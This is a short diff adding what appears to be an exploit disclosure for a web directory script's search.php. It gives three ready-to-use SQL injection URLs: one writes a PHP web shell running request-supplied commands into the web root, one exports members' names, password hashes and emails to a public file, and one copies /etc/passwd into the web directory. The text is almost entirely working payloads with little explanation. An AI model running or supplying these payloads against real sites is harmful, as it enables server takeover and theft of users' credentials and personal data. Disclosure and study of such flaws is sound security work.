@@ -1,0 +1,5 @@
+1) A 'UNION SELECT' which results in a PHP shell-execution script http://example.com/search.php?namecondition=IS%20NULL))%20UNION%20((SELECT%20"<?php%20system($_REQUEST[cmd]);%20?>"%20INTO%20OUTFILE&namesearch=/var/www/exec.php&action=filter&filled=1&whichtype=categories 
+
+2) A 'UNION SELECT' which results in a member's name, password hash, and e-mail to be extracted to a file http://example.com/search.php?namecondition=IS%20NOT%20NULL))%20UNION%20((SELECT%20concat(name,0x3a,password,0x3a,email)%20FROM%20wsnlinks_members%20INTO%20OUTFILE&namesearch=/var/www/pass.txt&action=filter&filled=1&whichtype=categories 
+
+3) A 'UNION SELECT' which results in the /etc/passwd file being copied to a web directory file http://example.com/search.php?namecondition=IS%20NOT%20NULL))%20UNION%20((SELECT%20load_file(0x2f6574632f706173737764)%20INTO%20OUTFILE&namesearch=/var/www/passwd.txt&action=filter&filled=1&whichtype=categories
